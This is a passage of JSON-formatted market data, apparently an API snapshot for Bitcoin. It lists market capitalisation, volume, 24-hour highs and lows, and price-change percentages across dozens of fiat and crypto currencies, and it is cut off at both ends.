            ""twd"": ""2013-07-05T00:00:00.000Z"",
            ""uah"": ""2013-07-06T00:00:00.000Z"",
            ""usd"": ""2013-07-06T00:00:00.000Z"",
            ""vef"": ""2013-09-08T00:00:00.000Z"",
            ""vnd"": ""2015-01-14T00:00:00.000Z"",
            ""xag"": ""2013-07-05T00:00:00.000Z"",
            ""xau"": ""2013-07-05T00:00:00.000Z"",
            ""xdr"": ""2013-07-05T00:00:00.000Z"",
            ""xlm"": ""2018-11-20T00:00:00.000Z"",
            ""xrp"": ""2018-12-25T00:00:00.000Z"",
            ""yfi"": ""2020-09-12T20:09:36.122Z"",
            ""zar"": ""2013-07-05T00:00:00.000Z"",
            ""bits"": ""2021-05-19T13:14:13.071Z"",
            ""link"": ""2020-08-16T08:13:13.338Z"",
            ""sats"": ""2021-05-19T13:14:13.071Z""
        },
        ""market_cap"": {
            ""aed"": 5117089178983,
            ""ars"": 1195051044587304,
            ""aud"": 2136505612188,
            ""bch"": 2039476960,
            ""bdt"": 152864980325702,
            ""bhd"": 525134605952,
            ""bmd"": 1393428962498,
            ""bnb"": 2307370991,
            ""brl"": 6987628218240,
            ""btc"": 19669850,
            ""cad"": 1885455696301,
            ""chf"": 1257360624310,
            ""clp"": 1366106826170021,
            ""cny"": 10069475054598,
            ""czk"": 32660858744362,
            ""dkk"": 9636547823381,
            ""dot"": 144664482313,
            ""eos"": 1256074758845,
            ""eth"": 386021747,
            ""eur"": 1291939957444,
            ""gbp"": 1103524673422,
            ""gel"": 3755291053933,
            ""hkd"": 10905267680594,
            ""huf"": 509144284024208,
            ""idr"": 22142647014846552,
            ""ils"": 5147674944709,
            ""inr"": 116124691082151,
            ""jpy"": 210810474307412,
            ""krw"": 1876525690813658,
            ""kwd"": 428553257703,
            ""lkr"": 418480102602764,
            ""ltc"": 12587614094,
            ""mmk"": 2924948031069195,
            ""mxn"": 23082290106681,
            ""myr"": 6583255133323,
            ""ngn"": 1980062555710135,
            ""nok"": 15095803238108,
            ""nzd"": 2328999462783,
            ""php"": 78268556466291,
            ""pkr"": 387141946547051,
            ""pln"": 5552114914217,
            ""rub"": 129021200799021,
            ""sar"": 5226055323850,
            ""sek"": 14883507368527,
            ""sgd"": 1879759358703,
            ""thb"": 50697822657058,
            ""try"": 45191945896104,
            ""twd"": 44563946970712,
            ""uah"": 54634991026322,
            ""usd"": 1393428962498,
            ""vef"": 139524042015,
            ""vnd"": 34580696255241452,
            ""xag"": 55478844639,
            ""xau"": 617525913,
            ""xdr"": 1052068128694,
            ""xlm"": 9849670532839,
            ""xrp"": 2212605085019,
            ""yfi"": 150459163,
            ""zar"": 26295397951306,
            ""bits"": 19668054557957,
            ""link"": 72634075796,
            ""sats"": 1966805455795706
        },
        ""market_cap_rank"": 1,
        ""fully_diluted_valuation"": {
            ""aed"": 5463126193572,
            ""ars"": 1275864937268631,
            ""aud"": 2280984240141,
            ""bch"": 2177394141,
            ""bdt"": 163202291163367,
            ""bhd"": 560646203453,
            ""bmd"": 1487657923800,
            ""bnb"": 2463404185,
            ""brl"": 7460158190482,
            ""btc"": 21000000,
            ""cad"": 2012957374984,
            ""chf"": 1342388127541,
            ""clp"": 1458488160792809,
            ""cny"": 10750411220551,
            ""czk"": 34869510119884,
            ""dkk"": 10288207804890,
            ""dot"": 154447244314,
            ""eos"": 1341015306967,
            ""eth"": 412126004,
            ""eur"": 1379305846578,
            ""gbp"": 1178149205096,
            ""gel"": 4009238104642,
            ""hkd"": 11642723319826,
            ""huf"": 543574555195305,
            ""idr"": 23640016945313644,
            ""ils"": 5495780285000,
            ""inr"": 123977483952606,
            ""jpy"": 225066279633839,
            ""krw"": 2003423488592278,
            ""kwd"": 457533657439,
            ""lkr"": 446779317313454,
            ""ltc"": 13438836390,
            ""mmk"": 3122744131371266,
            ""mxn"": 24643202273546,
            ""myr"": 7028439860995,
            ""ngn"": 2113961909720350,
            ""nok"": 16116638815257,
            ""nzd"": 2486495256367,
            ""php"": 83561373665387,
            ""pkr"": 413321956064132,
            ""pln"": 5927570022067,
            ""rub"": 137746104661675,
            ""sar"": 5579461043213,
            ""sek"": 15889986692276,
            ""sgd"": 2006875829391,
            ""thb"": 54126202070592,
            ""try"": 48247997001410,
            ""twd"": 47577530402364,
            ""uah"": 58329616725738,
            ""usd"": 1487657923800,
            ""vef"": 148959187910,
            ""vnd"": 36919174338394576,
            ""xag"": 59230534926,
            ""xau"": 659285362,
            ""xdr"": 1123212973286,
            ""xlm"": 10515742681800,
            ""xrp"": 2362229848494,
            ""yfi"": 160633784,
            ""zar"": 28073592680037,
            ""bits"": 20998083143344,
            ""link"": 77545868002,
            ""sats"": 2099808314334366
        },
        ""market_cap_fdv_ratio"": 0.94,
        ""total_volume"": {
            ""aed"": 54563739557,
            ""ars"": 12743589758879,
            ""aud"": 22778856873,
            ""bch"": 21691270,
            ""bdt"": 1630005786919,
            ""bhd"": 5599532638,
            ""bmd"": 14858192293,
            ""bnb"": 24631145,
            ""brl"": 74509376891,
            ""btc"": 209687,
            ""cad"": 20105184603,
            ""chf"": 13406740062,
            ""clp"": 14566855191177,
            ""cny"": 107375698243,
            ""czk"": 348264140792,
            ""dkk"": 102755171895,
            ""dot"": 1544202457,
            ""eos"": 13403424044,
            ""eth"": 4115559,
            ""eur"": 13776010715,
            ""gbp"": 11766395633,
            ""gel"": 40042828229,
            ""hkd"": 116295813986,
            ""huf"": 5429183463833,
            ""idr"": 236163157862151,
            ""ils"": 54889876878,
            ""inr"": 1238129508654,
            ""jpy"": 2247635893631,
            ""krw"": 20006741308082,
            ""kwd"": 4569681614,
            ""lkr"": 4462271132993,
            ""ltc"": 134087395,
            ""mmk"": 31188845260187,
            ""mxn"": 246122983694,
            ""myr"": 70197529488,
            ""ngn"": 21113491248239,
            ""nok"": 160970015044,
            ""nzd"": 24838172609,
            ""php"": 834532716853,
            ""pkr"": 4128111042086,
            ""pln"": 59191828725,
            ""rub"": 1375758551694,
            ""sar"": 55725650195,
            ""sek"": 158676326184,
            ""sgd"": 20039333095,
            ""thb"": 540392453693,
            ""try"": 481901693913,
            ""twd"": 475172418624,
            ""uah"": 582575233068,
            ""usd"": 14858192293,
            ""vef"": 1487750794,
            ""vnd"": 368735434967713,
            ""xag"": 592344569,
            ""xau"": 6583219,
            ""xdr"": 11218247203,
            ""xlm"": 105010574670,
            ""xrp"": 23591847372,
            ""yfi"": 1604413,
            ""zar"": 280332485629,
            ""bits"": 209686760676,
            ""link"": 775026589,
            ""sats"": 20968676067567
        },
        ""high_24h"": {
            ""aed"": 261996,
            ""ars"": 61148959,
            ""aud"": 109332,
            ""bch"": 118.883,
            ""bdt"": 7819649,
            ""bhd"": 26869,
            ""bmd"": 71344,
            ""bnb"": 117.518,
            ""brl"": 357768,
            ""btc"": 1.0,
            ""cad"": 96540,
            ""chf"": 64351,
            ""clp"": 69900530,
            ""cny"": 515195,
            ""czk"": 1670316,
            ""dkk"": 493019,
            ""dot"": 7428,
            ""eos"": 65021,
            ""eth"": 19.868773,
            ""eur"": 66102,
            ""gbp"": 56458,
            ""gel"": 192272,
            ""hkd"": 558321,
            ""huf"": 26088978,
            ""idr"": 1132859413,
            ""ils"": 263516,
            ""inr"": 5948400,
            ""jpy"": 10801186,
            ""krw"": 95979583,
            ""kwd"": 21939,
            ""lkr"": 21406912,
            ""ltc"": 694.899,
            ""mmk"": 149622750,
            ""mxn"": 1183101,
            ""myr"": 337064,
            ""ngn"": 101379562,
            ""nok"": 774108,
            ""nzd"": 119179,
            ""php"": 4007132,
            ""pkr"": 19808370,
            ""pln"": 284207,
            ""rub"": 6605583,
            ""sar"": 267609,
            ""sek"": 762062,
            ""sgd"": 96188,
            ""thb"": 2598342,
            ""try"": 2313544,
            ""twd"": 2279242,
            ""uah"": 2794797,
            ""usd"": 71344,
            ""vef"": 7143.66,
            ""vnd"": 1770098420,
            ""xag"": 2854.69,
            ""xau"": 31.87,
            ""xdr"": 53817,
            ""xlm"": 506154,
            ""xrp"": 113347,
            ""yfi"": 7.90251,
            ""zar"": 1354423,
            ""bits"": 1002023,
            ""link"": 3733,
            ""sats"": 100202301
        },
        ""low_24h"": {
            ""aed"": 256301,
            ""ars"": 59771204,
            ""aud"": 107061,
            ""bch"": 103.06,
            ""bdt"": 7649671,
            ""bhd"": 26279,
            ""bmd"": 69793,
            ""bnb"": 114.925,
            ""brl"": 350026,
            ""btc"": 1.0,
            ""cad"": 94287,
            ""chf"": 62973,
            ""clp"": 68380388,
            ""cny"": 503954,
            ""czk"": 1632270,
            ""dkk"": 482360,
            ""dot"": 7333,
            ""eos"": 63779,
            ""eth"": 19.37795,
            ""eur"": 64623,
            ""gbp"": 55288,
            ""gel"": 188441,
            ""hkd"": 546259,
            ""huf"": 25468163,
            ""idr"": 1108319793,
            ""ils"": 257560,
            ""inr"": 5819573,
            ""jpy"": 10562821,
            ""krw"": 93962314,
            ""kwd"": 21475,
            ""lkr"": 20941585,
            ""ltc"": 635.897,
            ""mmk"": 146370365,
            ""mxn"": 1155849,
            ""myr"": 329737,
            ""ngn"": 99175851,
            ""nok"": 757268,
            ""nzd"": 116965,
            ""php"": 3919889,
            ""pkr"": 19373370,
            ""pln"": 277628,
            ""rub"": 6462315,
            ""sar"": 262052,
            ""sek"": 743819,
            ""sgd"": 94186,
            ""thb"": 2542955,
            ""try"": 2259884,
            ""twd"": 2229251,
            ""uah"": 2734045,
            ""usd"": 69793,
            ""vef"": 6988.37,
            ""vnd"": 1731621372,
            ""xag"": 2795.61,
            ""xau"": 31.3,
            ""xdr"": 52648,
            ""xlm"": 497576,
            ""xrp"": 111890,
            ""yfi"": 7.621098,
            ""zar"": 1320372,
            ""bits"": 998900,
            ""link"": 3638,
            ""sats"": 99889981
        },
        ""price_change_24h"": 693.807,
        ""price_change_percentage_24h"": 0.98907,
        ""price_change_percentage_7d"": 6.43312,
        ""price_change_percentage_14d"": 4.77115,
        ""price_change_percentage_30d"": 14.12967,
        ""price_change_percentage_60d"": 68.78513,
        ""price_change_percentage_200d"": 170.29983,
        ""price_change_percentage_1y"": 147.43093,
        ""market_cap_change_24h"": 16872932234,
        ""market_cap_change_percentage_24h"": 1.22574,
        ""price_change_24h_in_currency"": {
            ""aed"": 2547.87,
            ""ars"": 684444,
            ""aud"": 1000.95,
            ""bch"": -13.37237193506121,
            ""bdt"": 83061,
            ""bhd"": 285.53,
            ""bmd"": 693.81,
            ""bnb"": 1.735047,
            ""brl"": 3444.16,
            ""btc"": 0.0,
            ""cad"": 1092.3,
            ""chf"": 628.0,
            ""clp"": 724547,
            ""cny"": 5434.82,
            ""czk"": 19902.94,
            ""dkk"": 5108.58,
            ""dot"": -23.73842145249273,
            ""eos"": -530.3239027191157,
            ""eth"": -0.24646110592666304,
            ""eur"": 730.89,
            ""gbp"": 531.2,
            ""gel"": 1519.07,
            ""hkd"": 5444.49,
            ""huf"": 287889,
            ""idr"": 12036028,
            ""ils"": 2837.37,
            ""inr"": 54056,
            ""jpy"": 99868,
            ""krw"": 949124,
            ""kwd"": 203.07,
            ""lkr"": 227387,
            ""ltc"": -35.97453763127737,
            ""mmk"": 1589225,
            ""mxn"": 11752.32,
            ""myr"": 3277.96,
            ""ngn"": 985899,
            ""nok"": 6362.96,
            ""nzd"": 865.06,
            ""php"": 39109,
            ""pkr"": 210350,
            ""pln"": 3178.55,
            ""rub"": 64241,
            ""sar"": 2307.01,
            ""sek"": 8944.47,
            ""sgd"": 880.04,
            ""thb"": 20626,
            ""try"": 26262,
            ""twd"": 24966,
            ""uah"": 29686,
            ""usd"": 693.81,
            ""vef"": 69.47,
            ""vnd"": 17650322,
            ""xag"": 14.39,
            ""xau"": -0.06858630230488671,
            ""xdr"": 571.61,
            ""xlm"": -1817.817659276363,
            ""xrp"": 151.216,
            ""yfi"": -0.24604609882212003,
            ""zar"": 9498.7,
            ""bits"": -968.8589263577014,
            ""link"": 8.22898,
            ""sats"": -96885.89263576269
        },
        ""price_change_percentage_1h_in_currency"": {
            ""aed"": -0.27559,
            ""ars"": -0.19205,
            ""aud"": -0.11649,
            ""bch"": -0.547,
            ""bdt"": -0.27559,
            ""bhd"": -0.27559,
            ""bmd"": -0.27559,
            ""bnb"": 0.0368,
            ""brl"": -0.27559,
            ""btc"": 0.0,
            ""cad"": -0.22523,
            ""chf"": -0.20525,
            ""clp"": -0.27559,
            ""cny"": -0.20102,
            ""czk"": -0.21301,
            ""dkk"": -0.20897,
            ""dot"": -0.24014,
            ""eos"": -1.23222,
            ""eth"": 0.00432,
            ""eur"": -0.21413,
            ""gbp"": -0.21006,
            ""gel"": -0.27559,
            ""hkd"": -0.26212,
            ""huf"": -0.2099,
            ""idr"": -0.12399,
            ""ils"": -0.27559,
            ""inr"": -0.28024,
            ""jpy"": -0.32731,
            ""krw"": -0.11845,
            ""kwd"": -0.27559,
            ""lkr"": -0.27559,
            ""ltc"": -3.82289,
            ""mmk"": -0.27559,
            ""mxn"": -0.23259,
            ""myr"": -0.28614,
            ""ngn"": -0.27559,
            ""nok"": -0.29478,
            ""nzd"": -0.13077,
            ""php"": -0.29333,
            ""pkr"": -0.27559,
            ""pln"": -0.19239,
            ""rub"": -0.27559,
            ""sar"": -0.27559,
            ""sek"": -0.2458,
            ""sgd"": -0.21573,
            ""thb"": -0.22621,
            ""try"": -0.27098,
            ""twd"": -0.21256,
            ""uah"": -0.27559,
            ""usd"": -0.27559,
            ""vef"": -0.27559,
            ""vnd"": -0.25759,
            ""xag"": 0.19613,
            ""xau"": -0.31609,
            ""xdr"": -0.27559,
            ""xlm"": -0.37927,
            ""xrp"": -0.3006,
            ""yfi"": -0.94487,
            ""zar"": -0.18724,
            ""bits"": -0.01407,
            ""link"": -0.43484,
            ""sats"": -0.01407
        },
        ""price_change_percentage_24h_in_currency"": {
            ""aed"": 0.98907,
            ""ars"": 1.13932,
            ""aud"": 0.93021,
            ""bch"": -11.44965,
            ""bdt"": 1.08032,
            ""bhd"": 1.08106,
            ""bmd"": 0.98907,
            ""bnb"": 1.49958,
            ""brl"": 0.979,
            ""btc"": 0.0,
            ""cad"": 1.15263,
            ""chf"": 0.9922,
            ""clp"": 1.05423,
            ""cny"": 1.07298,
            ""czk"": 1.21318,
            ""dkk"": 1.05373,
            ""dot"": -0.32139,
            ""eos"": -0.82303,
            ""eth"": -1.24044,
            ""eur"": 1.12529,
            ""gbp"": 0.95592,
            ""gel"": 0.80205,
            ""hkd"": 0.99165,
            ""huf"": 1.12467,
            ""idr"": 1.08048,
            ""ils"": 1.09607,
            ""inr"": 0.92417,
            ""jpy"": 0.94069,
            ""krw"": 1.00501,
            ""kwd"": 0.94082,
            ""lkr"": 1.08033,
            ""ltc"": -5.32734,
            ""mmk"": 1.08027,
            ""mxn"": 1.01163,
            ""myr"": 0.98909,
            ""ngn"": 0.98907,
            ""nok"": 0.836,
            ""nzd"": 0.73585,
            ""php"": 0.99267,
            ""pkr"": 1.08028,
            ""pln"": 1.13911,
            ""rub"": 0.98907,
            ""sar"": 0.87591,
            ""sek"": 1.19643,
            ""sgd"": 0.92965,
            ""thb"": 0.80702,
            ""try"": 1.15622,
            ""twd"": 1.11427,
            ""uah"": 1.0803,
            ""usd"": 0.98907,
            ""vef"": 0.98907,
            ""vnd"": 1.01414,
            ""xag"": 0.51215,
            ""xau"": -0.21804,
            ""xdr"": 1.08024,
            ""xlm"": -0.36176,
            ""xrp"": 0.13462,
            ""yfi"": -3.11623,
            ""zar"": 0.71576,
            ""bits"": -0.09682,
            ""link"": 0.22319,
            ""sats"": -0.09682
        },
        ""price_change_percentage_7d_in_currency"": {
            ""aed"": 6.43254,
            ""ars"": 6.86001,
            ""aud"": 6.53895,
            ""bch"": -24.43855,
            ""bdt"": 6.86177,
            ""bhd"": 6.77367,
            ""bmd"": 6.43312,
            ""bnb"": 0.358,
            ""brl"": 6.69695,
            ""btc"": 0.0,
            ""cad"": 5.91074,
            ""chf"": 7.01127,
            ""clp"": 6.45019,
            ""cny"": 6.42133,
            ""czk"": 6.36505,
            ""dkk"": 6.74308,
            ""dot"": 3.69092,
            ""eos"": 0.95609,
            ""eth"": 1.10257,
            ""eur"": 6.73784,
            ""gbp"": 6.29071,
            ""gel"": 6.23602,
            ""hkd"": 6.54576,
            ""huf"": 5.8739,
            ""idr"": 7.17737,
            ""ils"": 7.9605,
            ""inr"": 6.34903,
            ""jpy"": 6.43259,
            ""krw"": 7.03226,
            ""kwd"": 6.58456,
            ""lkr"": 5.82243,
            ""ltc"": -14.62186,
            ""mmk"": 6.86303,
            ""mxn"": 5.36351,
            ""myr"": 6.36107,
            ""ngn"": 4.38436,
            ""nok"": 7.46454,
            ""nzd"": 6.80823,
            ""php"": 6.19679,
            ""pkr"": 6.39513,
            ""pln"": 6.12556,
            ""rub"": 6.9644,
            ""sar"": 6.57076,
            ""sek"": 7.71537,
            ""sgd"": 6.56784,
            ""thb"": 6.65746,
            ""try"": 7.36898,
            ""twd"": 6.5584,
            ""uah"": 7.43626,
            ""usd"": 6.43312,
            ""vef"": 6.43312,
            ""vnd"": 6.51237,
            ""xag"": 5.37447,
            ""xau"": 2.53375,
            ""xdr"": 7.38777,
            ""xlm"": 1.41051,
            ""xrp"": 6.63495,
            ""yfi"": 1.71168,
            ""zar"": 6.00349,
            ""bits"": -0.03889,
            ""link"": 2.92628,
            ""sats"": -0.03889
        },
        ""price_change_percentage_14d_in_currency"": {
            ""aed"": 4.7637,
            ""ars"": 5.63437,
            ""aud"": 5.44249,
            ""bch"": -39.23124,
            ""bdt"": 4.70002,
            ""bhd"": 4.73113,
            ""bmd"": 4.77115,
            ""bnb"": -3.00247,
            ""brl"": 5.26864,
            ""btc"": 0.0,
            ""cad"": 4.70762,
            ""chf"": 7.01241,
            ""clp"": 9.06271,
            ""cny"": 6.60176,
            ""czk"": 6.35841,
            ""dkk"": 5.7983,
            ""dot"": 8.46917,
            ""eos"": -5.36426,
            ""eth"": 4.54081,
            ""eur"": 5.77198,
            ""gbp"": 5.64441,
            ""gel"": 6.34962,
            ""hkd"": 4.84221,
            ""huf"": 6.10692,
            ""idr"": 6.48531,
            ""ils"": 5.12469,
            ""inr"": 5.33938,
            ""jpy"": 6.23647,
            ""krw"": 5.84983,
            ""kwd"": 4.84376,
            ""lkr"": 3.0363,
            ""ltc"": -19.77493,
            ""mmk"": 4.6991,
            ""mxn"": 3.76078,
            ""myr"": 4.91549,
            ""ngn"": -6.49076,
            ""nok"": 6.97518,
            ""nzd"": 6.65396,
            ""php"": 5.78633,
            ""pkr"": 4.15757,
            ""pln"": 5.608,
            ""rub"": 4.84271,
            ""sar"": 4.76501,
            ""sek"": 8.00745,
            ""sgd"": 5.60514,
            ""thb"": 6.08223,
            ""try"": 5.18334,
            ""twd"": 5.88527,
            ""uah"": 5.86581,
            ""usd"": 4.77115,
            ""vef"": 4.77115,
            ""vnd"": 5.07832,
            ""xag"": 4.69452,
            ""xau"": -0.06253,
            ""xdr"": 5.63101,
            ""xlm"": -3.67887,
            ""xrp"": 1.72526,
            ""yfi"": 3.66397,
            ""zar"": 5.29071,
            ""bits"": -0.00803,
            ""link"": 2.93493,
            ""sats"": -0.00803
        },
        ""price_change_percentage_30d_in_currency"": {
            ""aed"": 14.10792,
            ""ars"": 16.26219,
            ""aud"": 14.34104,
            ""bch"": -38.93242,
            ""bdt"": 14.12645,
            ""bhd"": 14.12422,
            ""bmd"": 14.12967,
            ""bnb"": -22.64426,
            ""brl"": 15.51175,
            ""btc"": 0.0,
            ""cad"": 13.73362,
            ""chf"": 16.46052,
            ""clp"": 15.71266,
            ""cny"": 14.60383,
            ""czk"": 14.37952,
            ""dkk"": 14.77067,
            ""dot"": 3.43986,
            ""eos"": -1.45011,
            ""eth"": 8.71434,
            ""eur"": 14.76292,
            ""gbp"": 14.39489,
            ""gel"": 16.06772,
            ""hkd"": 14.10343,
            ""huf"": 14.68836,
            ""idr"": 15.52903,
            ""ils"": 18.23099,
            ""inr"": 14.79561,
            ""jpy"": 15.02507,
            ""krw"": 15.3818,
            ""kwd"": 14.03808,
            ""lkr"": 10.53493,
            ""ltc"": -10.0736,
            ""mmk"": 14.13227,
            ""mxn"": 11.10403,
            ""myr"": 13.62462,
            ""ngn"": 2.77065,
            ""nok"": 17.53687,
            ""nzd"": 16.49542,
            ""php"": 14.41281,
            ""pkr"": 13.44938,
            ""pln"": 14.14818,
            ""rub"": 15.18643,
            ""sar"": 14.13716,
            ""sek"": 17.65101,
            ""sgd"": 14.46116,
            ""thb"": 15.94118,
            ""try"": 17.92371,
            ""twd"": 15.59793,
            ""uah"": 17.2986,
            ""usd"": 14.12967,
            ""vef"": 14.12967,
            ""vnd"": 14.87948,
            ""xag"": 5.2609,
            ""xau"": 5.30933,
            ""xdr"": 14.40985,
            ""xlm"": 4.80824,
            ""xrp"": 12.69758,
            ""yfi"": 11.77204,
            ""zar"": 12.96311,
            ""bits"": -0.0106,
            ""link"": 21.36665,
            ""sats"": -0.0106
        },
        ""price_change_percentage_60d_in_currency"": {
            ""aed"": 68.75296,
            ""ars"": 75.18378,
            ""aud"": 70.08997,
            ""bch"": -43.08736,
            ""bdt"": 69.01616,
            ""bhd"": 68.7417,
            ""bmd"": 68.78513,
            ""bnb"": -16.89285,
            ""brl"": 70.87045,
            ""btc"": 0.0,
            ""cad"": 70.06558,
            ""chf"": 76.56868,
            ""clp"": 77.88244,
            ""cny"": 71.76324,
            ""czk"": 72.27184,
            ""dkk"": 69.24583,
            ""dot"": 15.38232,
            ""eos"": 3.20815,
            ""eth"": 5.10496,
            ""eur"": 69.14086,
            ""gbp"": 69.48476,
            ""gel"": 70.04708,
            ""hkd"": 68.99932,
            ""huf"": 73.54406,
            ""idr"": 70.1629,
            ""ils"": 71.3195,
            ""inr"": 69.31324,
            ""jpy"": 73.78745,
            ""krw"": 70.57129,
            ""kwd"": 68.79391,
            ""lkr"": 60.69171,
            ""ltc"": 0.38932,
            ""mmk"": 69.01533,
            ""mxn"": 62.47629,
            ""myr"": 68.60669,
            ""ngn"": 152.09275,
            ""nok"": 73.86214,
            ""nzd"": 72.73524,
            ""php"": 68.41931,
            ""pkr"": 67.89868,
            ""pln"": 67.86377,
            ""rub"": 73.78617,
            ""sar"": 68.80165,
            ""sek"": 73.24001,
            ""sgd"": 69.89771,
            ""thb"": 72.87286,
            ""try"": 80.28301,
            ""twd"": 72.56997,
            ""uah"": 76.60555,
            ""usd"": 68.78513,
            ""vef"": 68.78513,
            ""vnd"": 71.49073,
            ""xag"": 54.42974,
            ""xau"": 52.62899,
            ""xdr"": 70.01597,
            ""xlm"": 29.37566,
            ""xrp"": 32.29067,
            ""yfi"": 27.59887,
            ""zar"": 70.49668,
            ""bits"": -0.0086,
            ""link"": 33.82343,
            ""sats"": -0.0086
        },
        ""price_change_percentage_200d_in_currency"": {
            ""aed"": 170.24427,
            ""ars"": 562.41869,
            ""aud"": 166.78827,
            ""bch"": -20.12011,
            ""bdt"": 170.27432,
            ""bhd"": 170.24964,
            ""bmd"": 170.29983,
            ""bnb"": -4.86351,
            ""brl"": 175.69313,
            ""btc"": 0.0,
            ""cad"": 170.20957,
            ""chf"": 173.31525,
            ""clp"": 198.6957,
            ""cny"": 168.55695,
            ""czk"": 178.57415,
            ""dkk"": 169.12034,
            ""dot"": 13.14423,
            ""eos"": 35.76961,
            ""eth"": 21.49531,
            ""eur"": 169.16126,
            ""gbp"": 167.51026,
            ""gel"": 177.19104,
            ""hkd"": 170.25874,
            ""huf"": 176.44534,
            ""idr"": 179.64118,
            ""ils"": 161.07724,
            ""inr"": 171.57872,
            ""jpy"": 177.94045,
            ""krw"": 174.25633,
            ""kwd"": 169.35397,
            ""lkr"": 150.99897,
            ""ltc"": 52.48208,
            ""mmk"": 170.25494,
            ""mxn"": 161.32507,
            ""myr"": 172.78256,
            ""ngn"": 416.06393,
            ""nok"": 173.79539,
            ""nzd"": 168.2349,
            ""php"": 167.75891,
            ""pkr"": 154.42418,
            ""pln"": 150.04926,
            ""rub"": 160.70588,
            ""sar"": 170.27043,
            ""sek"": 159.70134,
            ""sgd"": 168.107,
            ""thb"": 175.22236,
            ""try"": 225.43665,
            ""twd"": 170.80367,
            ""uah"": 187.04643,
            ""usd"": 170.29983,
            ""vef"": 170.29983,
            ""vnd"": 177.61158,
            ""xag"": 146.95218,
            ""xau"": 128.86305,
            ""xdr"": 169.74179,
            ""xlm"": 129.51779,
            ""xrp"": 107.3132,
            ""yfi"": 56.20933,
            ""zar"": 171.63257,
            ""bits"": 0.02049,
            ""link"": -14.90508,
            ""sats"": 0.02049
        },
        ""price_change_percentage_1y_in_currency"": {
            ""aed"": 147.40398,
            ""ars"": 918.366,
            ""aud"": 153.69756,
            ""bch"": -54.62588,
            ""bdt"": 153.64243,
            ""bhd"": 147.63068,
            ""bmd"": 147.43093,
            ""bnb"": 30.44823,
            ""brl"": 145.05597,
            ""btc"": 0.0,
            ""cad"": 147.48361,
            ""chf"": 144.03643,
            ""clp"": 206.70916,
            ""cny"": 160.32336,
            ""czk"": 167.93482,
            ""dkk"": 149.03789,
            ""dot"": 63.84399,
            ""eos"": 168.00413,
            ""eth"": 25.68896,
            ""eur"": 149.31078,
            ""gbp"": 141.89245,
            ""gel"": 161.75716,
            ""hkd"": 146.70912,
            ""huf"": 158.17025,
            ""idr"": 162.73476,
            ""ils"": 153.87708,
            ""inr"": 150.89067,
            ""jpy"": 181.90156,
            ""krw"": 155.01453,
            ""kwd"": 148.14741,
            ""lkr"": 125.14078,
            ""ltc"": 104.76247,
            ""mmk"": 147.50643,
            ""mxn"": 127.48759,
            ""myr"": 164.92633,
            ""ngn"": 663.78189,
            ""nok"": 155.54406,
            ""nzd"": 158.84698,
            ""php"": 155.97148,
            ""pkr"": 142.22948,
            ""pln"": 128.37757,
            ""rub"": 195.51725,
            ""sar"": 147.31092,
            ""sek"": 154.6042,
            ""sgd"": 150.76013,
            ""thb"": 164.02481,
            ""try"": 318.44523,
            ""twd"": 159.10082,
            ""uah"": 164.55086,
            ""usd"": 147.43093,
            ""vef"": 147.43093,
            ""vnd"": 161.46426,
            ""xag"": 137.77185,
            ""xau"": 115.91181,
            ""xdr"": 151.1647,
            ""xlm"": 95.53073,
            ""xrp"": 110.7479,
            ""yfi"": 135.28607,
            ""zar"": 162.35624,
            ""bits"": -0.17001,
            ""link"": -1.99041,
            ""sats"": -0.17001
        },
        ""market_cap_change_24h_in_currency"": {
            ""aed"": 61962469043,
            ""ars"": 16158982680735,
            ""aud"": 24898945995,
            ""bch"": -252965515.93047905,
            ""bdt"": 1987363910745,
            ""bhd"": 6830976325,
            ""bmd"": 16872932234,
            ""bnb"": 30318631,
            ""brl"": 83924415259,
            ""btc"": 838.0,
            ""cad"": 25797327216,
            ""chf"": 15314766543,
            ""clp"": 17412289958322,
            ""cny"": 129776926869,
            ""czk"": 466929897763,
            ""dkk"": 122756131416,
            ""dot"": -537739003.1085205,
            ""eos"": -11615151103.687988,
            ""eth"": -4785529.584725857,
            ""eur"": 17363327570,
            ""gbp"": 13054153259,
            ""gel"": 38589772220,
            ""hkd"": 131170115120,
            ""huf"": 6825223020482,
            ""idr"": 282799598647376,
            ""ils"": 67715163984,
            ""inr"": 1342852958133,
            ""jpy"": 2475601907070,
            ""krw"": 23268307268903,
            ""kwd"": 4986967191,
            ""lkr"": 5440601729200,
            ""ltc"": -677195728.4585419,
            ""mmk"": 38025076117805,
            ""mxn"": 285008033872,
            ""myr"": 79717544896,
            ""ngn"": 23976436704640,
            ""nok"": 159894998535,
            ""nzd"": 22051236560,
            ""php"": 954973927959,
            ""pkr"": 5032996173518,
            ""pln"": 76348471885,
            ""rub"": 1562308547068,
            ""sar"": 57490761125,
            ""sek"": 212861475986,
            ""sgd"": 22096995861,
            ""thb"": 542067636280,
            ""try"": 619330064574,
            ""twd"": 595508463644,
            ""uah"": 710287539701,
            ""usd"": 16872932234,
            ""vef"": 1689486705,
            ""vnd"": 427215261961412,
            ""xag"": 339943023,
            ""xau"": 236893,
            ""xdr"": 13676852825,
            ""xlm"": -36157135528.31641,
            ""xrp"": 4186771403,
            ""yfi"": -5089543.177265912,
            ""zar"": 253161724911,
            ""bits"": -848042871.3945312,
            ""link"": 156466065,
            ""sats"": -84804287139.5
        },
        ""market_cap_change_percentage_24h_in_currency"": {
            ""aed"": 1.22574,
            ""ars"": 1.37069,
            ""aud"": 1.17915,
            ""bch"": -11.03476,
            ""bdt"": 1.3172,
            ""bhd"": 1.31795,
            ""bmd"": 1.22574,
            ""bnb"": 1.33149,
            ""brl"": 1.21564,
            ""btc"": 0.00426,
            ""cad"": 1.38721,
            ""chf"": 1.23303,
            ""clp"": 1.29105,
            ""cny"": 1.30564,
            ""czk"": 1.45037,
            ""dkk"": 1.2903,
            ""dot"": -0.37034,
            ""eos"": -0.91625,
            ""eth"": -1.22452,
            ""eur"": 1.36228,
            ""gbp"": 1.19711,
            ""gel"": 1.03828,
            ""hkd"": 1.21746,
            ""huf"": 1.35874,
            ""idr"": 1.29369,
            ""ils"": 1.33299,
            ""inr"": 1.16992,
            ""jpy"": 1.18828,
            ""krw"": 1.25554,
            ""kwd"": 1.17738,
            ""lkr"": 1.31721,
            ""ltc"": -5.1052,
            ""mmk"": 1.31715,
            ""mxn"": 1.25018,
            ""myr"": 1.22576,
            ""ngn"": 1.22574,
            ""nok"": 1.07054,
            ""nzd"": 0.95586,
            ""php"": 1.2352,
            ""pkr"": 1.31716,
            ""pln"": 1.3943,
            ""rub"": 1.22574,
            ""sar"": 1.11232,
            ""sek"": 1.45093,
            ""sgd"": 1.18951,
            ""thb"": 1.08077,
            ""try"": 1.38949,
            ""twd"": 1.3544,
            ""uah"": 1.31718,
            ""usd"": 1.22574,
            ""vef"": 1.22574,
